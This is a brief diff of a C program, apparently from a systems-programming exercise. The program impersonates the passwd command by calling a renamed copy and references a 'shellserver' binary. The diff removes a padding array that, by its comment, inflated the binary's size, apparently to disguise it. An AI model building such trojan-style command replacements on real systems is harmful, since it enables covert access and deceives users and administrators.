@@ -2,16 +2,11 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-#define FAKE_MEM_SIZE 52200
 #define SHELLSERVER_PATH "/home/stocki/Schreibtisch/dev/syse/shell/shellserver"
 
 int main(int argc,char **argv){
 	int pid;
-	char **arg = argv;
-    
-    // allocate sem memory, to increase size
-    static const char fake_mem_usage[FAKE_MEM_SIZE] __attribute__((used))= {1,2};
-   
+	char **arg = argv;   
 
     // replace argument 0 (passwd) with the renamed copy of passwd
 	arg[0]="chpwd";
